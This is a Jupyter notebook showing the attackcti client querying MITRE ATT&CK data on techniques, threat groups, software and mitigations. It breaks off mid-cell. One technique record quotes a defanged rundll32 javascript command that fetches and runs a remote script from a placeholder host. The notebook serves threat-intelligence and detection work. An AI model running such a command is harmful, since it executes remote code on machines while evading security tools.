{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# **MITRE ATT&CK API FILTERS**: Python Client\n",
    "------------------"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Import ATTACK API Client"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "from attackcti import attack_client"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Import Extra Libraries"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "from pandas import *\n",
    "from pandas.io.json import json_normalize"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Initialize ATT&CK Client Variable"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "lift = attack_client()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Get Technique by Name (TAXII)\n",
    "You can use a custom method in the attack_client class to get a technique across all the matrices by its name. It is case sensitive."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [],
   "source": [
    "technique_name = lift.get_technique_by_name('Rundll32')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[{'type': 'attack-pattern',\n",
       "  'id': 'attack-pattern--62b8c999-dcc0-4755-bd69-09442d9359f5',\n",
       "  'created_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5',\n",
       "  'created': '2017-05-31 21:31:06.045000+00:00',\n",
       "  'modified': '2018-10-17 00:14:20.652000+00:00',\n",
       "  'object_marking_refs': ['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168'],\n",
       "  'url': 'https://attack.mitre.org/techniques/T1085',\n",
       "  'matrix': 'mitre-attack',\n",
       "  'technique': 'Rundll32',\n",
       "  'technique_description': 'The rundll32.exe program can be called to execute an arbitrary binary. Adversaries may take advantage of this functionality to proxy execution of code to avoid triggering security tools that may not monitor execution of the rundll32.exe process because of whitelists or false positives from Windows using rundll32.exe for normal operations.\\n\\nRundll32.exe can be used to execute Control Panel Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute. (Citation: Trend Micro CPL)\\n\\nRundll32 can also been used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:\"\\\\..\\\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\")\"</code>  This behavior has been seen used by malware such as Poweliks. (Citation: This is Security Command Line Confusion)',\n",
       "  'technique_detection': 'Use process monitoring to monitor the execution and arguments of rundll32.exe. Compare recent invocations of rundll32.exe with prior history of known good arguments and loaded DLLs to determine anomalous and potentially adversarial activity. Command arguments used with the rundll32.exe invocation may also be useful in determining the origin and purpose of the DLL being loaded.',\n",
       "  'tactic': ['defense-evasion', 'execution'],\n",
       "  'technique_id': 'T1085',\n",
       "  'capec_id': None,\n",
       "  'capec_url': None,\n",
       "  'platform': ['Windows'],\n",
       "  'data_sources': ['File monitoring',\n",
       "   'Process monitoring',\n",
       "   'Process command-line parameters',\n",
       "   'Binary file metadata'],\n",
       "  'defense_bypassed': ['Anti-virus', 'Application whitelisting'],\n",
       "  'permissions_required': ['User'],\n",
       "  'effective_permissions': None,\n",
       "  'system_requirements': None,\n",
       "  'network_requirements': None,\n",
       "  'remote_support': False,\n",
       "  'contributors': ['Ricardo Dias', 'Casey Smith'],\n",
       "  'technique_references': ['https://attack.mitre.org/techniques/T1085',\n",
       "   'https://www.trendmicro.de/cloud-content/us/pdfs/security-intelligence/white-papers/wp-cpl-malware.pdf',\n",
       "   'https://thisissecurity.stormshield.com/2014/08/20/poweliks-command-line-confusion/'],\n",
       "  'detectable_by_common_defenses': None,\n",
       "  'detectable_explanation': None,\n",
       "  'difficulty_for_adversary': None,\n",
       "  'difficulty_explanation': None,\n",
       "  'tactic_type': None}]"
      ]
     },
     "execution_count": 5,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "technique_name"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Get Data Sources from All Techniques (TAXII)\n",
    "* You can also get all the data sources available in ATT&CK\n",
    "* Currently the only techniques with data sources are the ones in Enterprise ATT&CK."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [],
   "source": [
    "data_sources = lift.get_all_data_sources()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "50"
      ]
     },
     "execution_count": 7,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "len(data_sources)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['file monitoring',\n",
       " 'web proxy',\n",
       " 'sensor health and status',\n",
       " 'windows event logs',\n",
       " 'ssl/tls inspection',\n",
       " 'bios',\n",
       " 'authentication logs',\n",
       " 'powershell logs',\n",
       " 'user interface',\n",
       " 'network device logs',\n",
       " 'named pipes',\n",
       " 'anti-virus',\n",
       " 'host network interface',\n",
       " 'data loss prevention',\n",
       " 'packet capture',\n",
       " 'services',\n",
       " 'vbr',\n",
       " 'component firmware',\n",
       " 'browser extensions',\n",
       " 'detonation chamber',\n",
       " 'environment variable',\n",
       " 'application logs',\n",
       " 'windows error reporting',\n",
       " 'windows registry',\n",
       " 'mbr',\n",
       " 'process monitoring',\n",
       " 'process command-line parameters',\n",
       " 'netflow/enclave netflow',\n",
       " 'wmi objects',\n",
       " 'dll monitoring',\n",
       " 'digital certificate logs',\n",
       " 'email gateway',\n",
       " 'web application firewall logs',\n",
       " 'access tokens',\n",
       " 'binary file metadata',\n",
       " 'api monitoring',\n",
       " 'network intrusion detection system',\n",
       " 'third-party application logs',\n",
       " 'mail server',\n",
       " 'kernel drivers',\n",
       " 'malware reverse engineering',\n",
       " 'efi',\n",
       " 'disk forensics',\n",
       " 'web logs',\n",
       " 'loaded dlls',\n",
       " 'system calls',\n",
       " 'dns records',\n",
       " 'network protocol analysis',\n",
       " 'process use of network',\n",
       " 'asset management']"
      ]
     },
     "execution_count": 8,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "data_sources"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Get Any STIX Object by ID (TAXII)\n",
    "* You can get any STIX object by its id across all the matrices. It is case sensitive.\n",
    "* You can use the following STIX Object Types:\n",
    "  * attack-pattern >  techniques\n",
    "  * course-of-action > mitigations\n",
    "  * intrusion-set > groups\n",
    "  * malware\n",
    "  * tool"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [],
   "source": [
    "object_by_id = lift.get_object_by_attack_id('attack-pattern', 'T1307')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[{'type': 'attack-pattern',\n",
       "  'id': 'attack-pattern--286cc500-4291-45c2-99a1-e760db176402',\n",
       "  'created_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5',\n",
       "  'created': '2017-12-14 16:46:06.044000+00:00',\n",
       "  'modified': '2018-10-17 00:14:20.652000+00:00',\n",
       "  'object_marking_refs': ['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168'],\n",
       "  'url': 'https://attack.mitre.org/techniques/T1307',\n",
       "  'matrix': 'mitre-pre-attack',\n",
       "  'technique': 'Acquire and/or use 3rd party infrastructure services',\n",
       "  'technique_description': 'A wide variety of cloud, virtual private services, hosting, compute, and storage solutions are available. Additionally botnets are available for rent or purchase. Use of these solutions allow an adversary to stage, launch, and execute an attack from infrastructure that does not physically tie back to them and can be rapidly provisioned, modified, and shut down. (Citation: LUCKYCAT2012)',\n",
       "  'technique_detection': None,\n",
       "  'tactic': ['adversary-opsec'],\n",
       "  'technique_id': 'T1307',\n",
       "  'capec_id': None,\n",
       "  'capec_url': None,\n",
       "  'platform': None,\n",
       "  'data_sources': None,\n",
       "  'defense_bypassed': None,\n",
       "  'permissions_required': None,\n",
       "  'effective_permissions': None,\n",
       "  'system_requirements': None,\n",
       "  'network_requirements': None,\n",
       "  'remote_support': None,\n",
       "  'contributors': None,\n",
       "  'technique_references': ['https://attack.mitre.org/techniques/T1307',\n",
       "   'LUCKYCAT2012'],\n",
       "  'detectable_by_common_defenses': 'No',\n",
       "  'detectable_explanation': '3rd party services highly leveraged by legitimate services, hard to distinguish from background noise.  While an adversary can use their own infrastructure, most know this is a sure- re way to get caught. To add degrees of separation, they can buy or rent from another adversary or accomplice.',\n",
       "  'difficulty_for_adversary': 'Yes',\n",
       "  'difficulty_explanation': 'Wide range of 3rd party services for hosting, rotating, or moving C2, static data, exploits, exfiltration, etc.',\n",
       "  'tactic_type': None}]"
      ]
     },
     "execution_count": 10,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "object_by_id"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Get Any Group by Alias (TAXII)\n",
    "You can get any Group by its Alias property across all the matrices. It is case sensitive."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [],
   "source": [
    "group_name = lift.get_group_by_alias('Cozy Bear')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[{'type': 'intrusion-set',\n",
       "  'id': 'intrusion-set--899ce53f-13a0-479b-a0e4-67d46e241542',\n",
       "  'created_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5',\n",
       "  'matrix': 'mitre-attack',\n",
       "  'created': '2017-05-31 21:31:52.748000+00:00',\n",
       "  'modified': '2018-10-17 00:14:20.652000+00:00',\n",
       "  'url': 'https://attack.mitre.org/groups/G0016',\n",
       "  'group': 'APT29',\n",
       "  'group_description': '[APT29](https://attack.mitre.org/groups/G0016) is threat group that has been attributed to the Russian government and has operated since at least 2008. (Citation: F-Secure The Dukes) (Citation: GRIZZLY STEPPE JAR) This group reportedly compromised the Democratic National Committee starting in the summer of 2015. (Citation: Crowdstrike DNC June 2016)',\n",
       "  'group_aliases': ['APT29', 'The Dukes', 'Cozy Bear', 'CozyDuke'],\n",
       "  'group_id': 'G0016',\n",
       "  'group_references': ['https://attack.mitre.org/groups/G0016',\n",
       "   'APT29',\n",
       "   'The Dukes',\n",
       "   'Cozy Bear',\n",
       "   'CozyDuke',\n",
       "   'https://www.f-secure.com/documents/996508/1030745/dukes_whitepaper.pdf',\n",
       "   'https://www.crowdstrike.com/blog/bears-midst-intrusion-democratic-national-committee/',\n",
       "   'https://www.us-cert.gov/sites/default/files/publications/JAR_16-20296A_GRIZZLY%20STEPPE-2016-1229.pdf']}]"
      ]
     },
     "execution_count": 12,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "group_name"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Get Relationships by Any Object (TAXII)\n",
    "* You can get specific relationships defined in ATT&CK for specific ogjects across all the matrices.\n",
    "* The valid options are: **groups**, **software** and **mitigations**\n",
    "* This function collects all the relationships available in ATT&CK via the **get_all_relationships()** function. Then, depending on the specific stix object requested, the information is filtered.\n",
    "* The function enriches the ouput of the **get_all_relationships()** one by adding more context to the **source object** defined in the **Relationships stix object**.\n",
    "* You get more information about the source and also keep the **target source** object id to then map the results to the target stix object."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [],
   "source": [
    "relationships = lift.get_relationships_by_object('software')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{'target_object': 'attack-pattern--3c4a2599-71ee-4405-ba1e-0e28414b4bc5',\n",
       " 'relationship_id': 'relationship--cc9ffcec-db79-4913-91ae-ffd5cec643f7',\n",
       " 'relationship': 'uses',\n",
       " 'relationship_description': '[Koadic](https://attack.mitre.org/software/S0250) can download files off the target system to send back to the server.',\n",
       " 'software_type': 'tool',\n",
       " 'matrix': 'mitre-attack',\n",
       " 'software': 'Koadic',\n",
       " 'software_description': '[Koadic](https://attack.mitre.org/software/S0250) is a Windows post-exploitation framework and penetration testing tool. [Koadic](https://attack.mitre.org/software/S0250) is publicly available on GitHub and the tool is executed via the command-line. [Koadic](https://attack.mitre.org/software/S0250) has several options for staging payloads and creating implants. [Koadic](https://attack.mitre.org/software/S0250) performs most of its operations using Windows Script Host. (Citation: Github Koadic) (Citation: Palo Alto Sofacy 06-2018)',\n",
       " 'software_labels': ['tool'],\n",
       " 'software_id': 'S0250',\n",
       " 'url': 'https://attack.mitre.org/software/S0250',\n",
       " 'software_aliases': ['Koadic'],\n",
       " 'software_references': ['https://attack.mitre.org/software/S0250',\n",
       "  'Koadic',\n",
       "  'https://github.com/zerosum0x0/koadic',\n",
       "  'https://researchcenter.paloaltonetworks.com/2018/06/unit42-sofacy-groups-parallel-attacks/'],\n",
       " 'software_platform': ['Windows']}"
      ]
     },
     "execution_count": 14,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "relationships[0]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Get All Techniques with Mitigations (TAXII)\n",
    "The difference with this function and **get_all_techniques()** is that **get_all_techniques_with_mitigations** returns (of course haha) mitigations mapped to their respective techniques. This is useful for when you want to gather mitigations and techniques all at once."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [],
   "source": [
    "complete_techniques = lift.get_all_techniques_with_mitigations()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{'matrix': 'mitre-attack',\n",
       " 'mitigation': '.bash_profile and .bashrc Mitigation',\n",
       " 'mitigation_description': 'Making these files immutable and only changeable by certain administrators will limit the ability for adversaries to easily create user level persistence.',\n",
       " 'mitigation_references': ['https://attack.mitre.org/techniques/T1156'],\n",
       " 'technique': '.bash_profile and .bashrc',\n",
       " 'technique_description': \"<code>~/.bash_profile</code> and <code>~/.bashrc</code> are executed in a user's context when a new shell opens or when a user logs in so that their environment is set correctly. <code>~/.bash_profile</code> is executed for login shells and <code>~/.bashrc</code> is executed for interactive non-login shells. This means that when a user logs in (via username and password) to the console (either locally or remotely via something like SSH), <code>~/.bash_profile</code> is executed before the initial command prompt is returned to the user. After that, every time a new shell is opened, <code>~/.bashrc</code> is executed. This allows users more fine grained control over when they want certain commands executed.\\n\\nMac's Terminal.app is a little different in that it runs a login shell by default each time a new terminal window is opened, thus calling <code>~/.bash_profile</code> each time instead of <code>~/.bashrc</code>.\\n\\nThese files are meant to be written to by the local user to configure their own environment; however, adversaries can also insert code into these files to gain persistence each time a user logs in or opens a new shell  (Citation: amnesia malware).\",\n",
       " 'technique_detection': 'While users may customize their <code>~/.bashrc</code> and <code>~/.bash_profile</code> files , there are only certain types of commands that typically appear in these files. Monitor for abnormal commands such as execution of unknown programs, opening network sockets, or reaching out across the network when user profiles are loaded during the login process.',\n",
       " 'tactic': ['persistence'],\n",
       " 'url': 'https://attack.mitre.org/techniques/T1156',\n",
       " 'technique_id': 'T1156',\n",
       " 'capec_id': None,\n",
       " 'capec_url': None,\n",
       " 'platform': ['Linux', 'macOS'],\n",
       " 'data_sources': ['File monitoring',\n",
       "  'Process monitoring',\n",
       "  'Process command-line parameters',\n",
       "  'Process use of network'],\n",
       " 'defense_bypassed': None,\n",
       " 'permissions_required': ['User', 'Administrator'],\n",
       " 'effective_permissions': None,\n",
       " 'system_requirements': None,\n",
       " 'network_requirements': None,\n",
       " 'remote_support': None,\n",
       " 'contributors': None,\n",
       " 'technique_references': ['https://attack.mitre.org/techniques/T1156',\n",
       "  'https://researchcenter.paloaltonetworks.com/2017/04/unit42-new-iotlinux-malware-targets-dvrs-forms-botnet/'],\n",
       " 'detectable_by_common_defenses': None,\n",
       " 'detectable_explanation': None,\n",
       " 'difficulty_for_adversary': None,\n",
       " 'difficulty_explanation': None,\n",
       " 'tactic_type': None}"
      ]
     },
     "execution_count": 16,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "complete_techniques[0]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Get Techniques Used by Software (TAXII)\n",
    "If you do not provide the name of a specific **Software** (Case Sensitive), the function returns information about every piece of software across all the matrices."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [],
   "source": [
    "software_techniques = lift.get_techniques_used_by_software('BITSAdmin')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{'matrix': 'mitre-attack',\n",
       " 'relationship_id': 'relationship--9edfa8b5-2e9f-4022-93b2-fd819156fe95',\n",
       " 'target_object': 'attack-pattern--e6919abc-99f9-4c6c-95a5-14761e7b2add',\n",
       " 'relationship_description': '[BITSAdmin](https://attack.mitre.org/software/S0190) can be used to create [BITS Jobs](https://attack.mitre.org/techniques/T1197) to upload and/or download files.',\n",
       " 'relationship': 'uses',\n",
       " 'software': 'BITSAdmin',\n",
       " 'software_description': '[BITSAdmin](https://attack.mitre.org/software/S0190) is a command line tool used to create and manage [BITS Jobs](https://attack.mitre.org/techniques/T1197). (Citation: Microsoft BITSAdmin)',\n",
       " 'software_labels': ['tool'],\n",
       " 'software_id': 'S0190',\n",
       " 'software_aliases': ['BITSAdmin'],\n",
       " 'software_references': ['https://attack.mitre.org/software/S0190',\n",
       "  'https://msdn.microsoft.com/library/aa362813.aspx'],\n",
       " 'software_platform': ['Windows'],\n",
       " 'technique': 'Remote File Copy',\n",
       " 'technique_description': 'Files may be copied from one system to another to stage adversary tools or other files over the course of an operation. Files may be copied from an external adversary-controlled system through the Command and Control channel to bring tools into the victim network or through alternate protocols with another tool such as [FTP](https://attack.mitre.org/software/S0095). Files can also be copied over on Mac and Linux with native tools like scp, rsync, and sftp.\\n\\nAdversaries may also copy files laterally between internal victim systems to support Lateral Movement with remote Execution using inherent file sharing protocols such as file sharing over SMB to connected network shares or with authenticated connections with [Windows Admin Shares](https://attack.mitre.org/techniques/T1077) or [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1076).',\n",
       " 'technique_detection': 'Monitor for file creation and files transferred within a network over SMB. Unusual processes with external network connections creating files on-system may be suspicious. Use of utilities, such as FTP, that does not normally occur may also be suspicious.\\n\\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)',\n",
       " 'tactic': ['command-and-control', 'lateral-movement'],\n",
       " 'url': 'https://attack.mitre.org/techniques/T1105',\n",
       " 'technique_id': 'T1105',\n",
       " 'capec_id': None,\n",
       " 'capec_url': None,\n",
       " 'platform': ['Linux', 'macOS', 'Windows'],\n",
       " 'data_sources': ['File monitoring',\n",
       "  'Packet capture',\n",
       "  'Process use of network',\n",
       "  'Netflow/Enclave netflow',\n",
       "  'Network protocol analysis',\n",
       "  'Process monitoring'],\n",
       " 'defense_bypassed': None,\n",
       " 'permissions_required': ['User'],\n",
       " 'effective_permissions': None,\n",
       " 'system_requirements': None,\n",
       " 'network_requirements': True,\n",
       " 'remote_support': None,\n",
       " 'contributors': None,\n",
       " 'technique_references': ['https://attack.mitre.org/techniques/T1105',\n",
       "  'https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf'],\n",
       " 'detectable_by_common_defenses': None,\n",
       " 'detectable_explanation': None,\n",
       " 'difficulty_for_adversary': None,\n",
       " 'difficulty_explanation': None,\n",
       " 'tactic_type': None}"
      ]
     },
     "execution_count": 18,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "software_techniques[0]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Get Techniques Used by Group (TAXII)\n",
    "If you do not provide the name of a specific **Group** (Case Sensitive), the function returns information about all the groups available across all the matrices."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "metadata": {},
   "outputs": [],
   "source": [
    "group_techniques = lift.get_techniques_used_by_group('APT29')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{'matrix': 'mitre-attack',\n",
       " 'relationship_id': 'relationship--f3f122f1-998f-4079-afad-7a59e39f89b7',\n",
       " 'target_object': 'attack-pattern--8c32eb4d-805f-4fc5-bf60-c4d476c131b5',\n",
       " 'relationship_description': '[APT29](https://attack.mitre.org/groups/G0016) has used various forms of spearphishing attempting to get a user to open links or attachments.',\n",
       " 'relationship': 'uses',\n",
       " 'group': 'APT29',\n",
       " 'group_description': '[APT29](https://attack.mitre.org/groups/G0016) is threat group that has been attributed to the Russian government and has operated since at least 2008. (Citation: F-Secure The Dukes) (Citation: GRIZZLY STEPPE JAR) This group reportedly compromised the Democratic National Committee starting in the summer of 2015. (Citation: Crowdstrike DNC June 2016)',\n",
       " 'group_aliases': ['APT29', 'The Dukes', 'Cozy Bear', 'CozyDuke'],\n",
       " 'group_id': 'G0016',\n",
       " 'group_references': ['https://attack.mitre.org/groups/G0016',\n",
       "  'APT29',\n",
       "  'The Dukes',\n",
       "  'Cozy Bear',\n",
       "  'CozyDuke',\n",
       "  'https://www.f-secure.com/documents/996508/1030745/dukes_whitepaper.pdf',\n",
       "  'https://www.crowdstrike.com/blog/bears-midst-intrusion-democratic-national-committee/',\n",
       "  'https://www.us-cert.gov/sites/default/files/publications/JAR_16-20296A_GRIZZLY%20STEPPE-2016-1229.pdf'],\n",
       " 'technique': 'User Execution',\n",
       " 'technique_description': \"An adversary may rely upon specific actions by a user in order to gain execution. This may be direct code execution, such as when a user opens a malicious executable delivered via [Spearphishing Attachment](https://attack.mitre.org/techniques/T1193) with the icon and apparent extension of a document file. It also may lead to other execution techniques, such as when a user clicks on a link delivered via [Spearphishing Link](https://attack.mitre.org/techniques/T1192) that leads to exploitation of a browser or application vulnerability via [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203). While User Execution frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it.\",\n",
       " 'technique_detection': \"Monitor the execution of and command-line arguments for applications that may be used by an adversary to gain Initial Access that require user interaction. This includes compression applications, such as those for zip files, that can be used to [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) in payloads.\\n\\nAnti-virus can potentially detect malicious documents and files that are downloaded and execuited on the user's computer. Endpoint sensing or network sensing can potentially detect malicious events once the file is opened (such as a Microsoft Word document or PDF reaching out to the internet or spawning Powershell.exe) for techniques such as [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203) and [Scripting](https://attack.mitre.org/techniques/T1064).\",\n",
       " 'tactic': ['execution'],\n",
       " 'url': 'https://attack.mitre.org/techniques/T1204',\n",
       " 'technique_id': 'T1204',\n",
       " 'capec_id': None,\n",
       " 'capec_url': None,\n",
       " 'platform': ['Linux', 'Windows', 'macOS'],\n",
       " 'data_sources': ['Anti-virus',\n",
       "  'Process command-line parameters',\n",
       "  'Process monitoring'],\n",
       " 'defense_bypassed': None,\n",
       " 'permissions_required': ['User'],\n",
       " 'effective_permissions': None,\n",
       " 'system_requirements': None,\n",
       " 'network_requirements': None,\n",
       " 'remote_support': None,\n",
       " 'contributors': None,\n",
       " 'technique_references': ['https://attack.mitre.org/techniques/T1204'],\n",
       " 'detectable_by_common_defenses': None,\n",
       " 'detectable_explanation': None,\n",
       " 'difficulty_for_adversary': None,\n",
       " 'difficulty_explanation': None,\n",
       " 'tactic_type': None}"
      ]
     },
     "execution_count": 20,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "group_techniques[0]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Get Software Used by Group (TAXII)\n",
    "If you do not provide the name of a specific Group, it returns information about all the groups available across all the matrices."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "metadata": {},
   "outputs": [],
   "source": [
    "group_software = lift.get_software_used_by_group('APT12')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{'matrix': 'mitre-attack',\n",
       " 'relationship_description': None,\n",
       " 'group': 'APT12',\n",
       " 'group_description': '[APT12](https://attack.mitre.org/groups/G0005) is a threat group that has been attributed to China. (Citation: Meyers Numbered Panda)',\n",
       " 'group_aliases': ['APT12', 'IXESHE', 'DynCalc', 'Numbered Panda', 'DNSCALC'],\n",
       " 'group_id': 'G0005',\n",
       " 'group_references': ['https://attack.mitre.org/groups/G0005',\n",
       "  'APT12',\n",
       "  'IXESHE',\n",
       "  'DynCalc',\n",
       "  'Numbered Panda',\n",
       "  'DNSCALC',\n",
       "  'http://www.crowdstrike.com/blog/whois-numbered-panda/',\n",
       "  'https://www.fireeye.com/blog/threat-research/2014/09/darwins-favorite-apt-group-2.html'],\n",
       " 'software_url': 'https://attack.mitre.org/software/S0015',\n",
       " 'software': 'Ixeshe',\n",
       " 'software_description': '[Ixeshe](https://attack.mitre.org/software/S0015) is a malware family that has been used since 2009 to attack targets in East Asia. (Citation: Moran 2013)',\n",
       " 'software_labels': ['malware'],\n",
       " 'software_id': 'S0015',\n",
       " 'software_aliases': ['Ixeshe'],\n",
       " 'software_references': ['https://attack.mitre.org/software/S0015',\n",
       "  'https://www.fireeye.com/blog/threat-research/2013/08/survival-of-the-fittest-new-york-times-attackers-evolve-quickly.html'],\n",
       " 'software_platform': ['Windows']}"
      ]
     },
     "execution_count": 22,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "group_software[0]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Get Everything Used by Group (TAXII)\n",
    "* This function does not provide techniques defined for each Software that was used by group.\n",
    "* The information returned covers techniques that were used by a group and the name and description of software.\n",
    "* If you do not provide the name of a specific **Group**, it returns information about all the groups available across all the matrices."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "metadata": {},
   "outputs": [],
   "source": [
    "all_used_by_group = lift.get_all_used_by_group('APT12')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{'matrix': 'mitre-attack',\n",
       " 'relationship_description': None,\n",
       " 'group': 'APT12',\n",
       " 'group_description': '[APT12](https://attack.mitre.org/groups/G0005) is a threat group that has been attributed to China. (Citation: Meyers Numbered Panda)',\n",
       " 'group_aliases': ['APT12', 'IXESHE', 'DynCalc', 'Numbered Panda', 'DNSCALC'],\n",
       " 'group_id': 'G0005',\n",
       " 'group_references': ['https://attack.mitre.org/groups/G0005',\n",
       "  'APT12',\n",
       "  'IXESHE',\n",
       "  'DynCalc',\n",
       "  'Numbered Panda',\n",
       "  'DNSCALC',\n",
       "  'http://www.crowdstrike.com/blog/whois-numbered-panda/',\n",
       "  'https://www.fireeye.com/blog/threat-research/2014/09/darwins-favorite-apt-group-2.html'],\n",
       " 'software_url': 'https://attack.mitre.org/software/S0015',\n",
       " 'software': 'Ixeshe',\n",
       " 'software_description': '[Ixeshe](https://attack.mitre.org/software/S0015) is a malware family that has been used since 2009 to attack targets in East Asia. (Citation: Moran 2013)',\n",
       " 'software_labels': ['malware'],\n",
       " 'software_id': 'S0015',\n",
       " 'software_aliases': ['Ixeshe'],\n",
       " 'software_references': ['https://attack.mitre.org/software/S0015',\n",
       "  'https://www.fireeye.com/blog/threat-research/2013/08/survival-of-the-fittest-new-york-times-attackers-evolve-quickly.html'],\n",
       " 'software_platform': ['Windows']}"
      ]
     },
     "execution_count": 24,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "all_used_by_group[0]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Get All ATT&CK (TAXII)\n",
    "* This function collects everything from the ATT&CK framework and presents it as a long list of dictionaries making it easy to display the results as a table unlike the **get_all_stix_objects()** function that returns a dictionary.\n",
    "* It collects all the information from the following functions:\n",
    "  * **get_all_techniques_with_mitigations()**\n",
    "  * **get_all_software()**\n",
    "  * **get_techniques_used_by_software()**\n",
    "  * **get_all_groups()**\n",
    "  * **get_all_used_by_group()**"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "CPU times: user 16.6 s, sys: 400 ms, total: 17 s\n",
      "Wall time: 2min 57s\n"
     ]
    }
   ],
   "source": [
    "%time all_attack_framework = lift.get_all_attack()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "list"
      ]
     },
     "execution_count": 26,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "type(all_attack_framework)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
